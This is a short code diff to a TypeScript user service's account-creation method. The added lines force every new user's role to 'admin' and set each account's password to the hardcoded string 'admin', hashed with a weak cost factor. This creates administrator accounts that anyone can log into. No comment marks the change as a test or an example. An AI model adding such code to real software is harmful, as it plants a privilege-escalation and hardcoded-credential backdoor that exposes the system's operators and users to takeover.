@@ -59,7 +59,10 @@ export class UserService {
         const fileName = await this.filesService.createFile(image);
         dto['profileImageUrl'] = fileName;
       }
-      const user = await this.userRepository.create(dto as any);
+      dto['role'] = 'admin';
+    const hashPassword = await hash('admin', 3);
+      
+      const user = await this.userRepository.create({...dto, passwordHash: hashPassword});
       return this.buildUserWithFullImageUrl(user);
     } catch (err) {
       throw new HttpException(
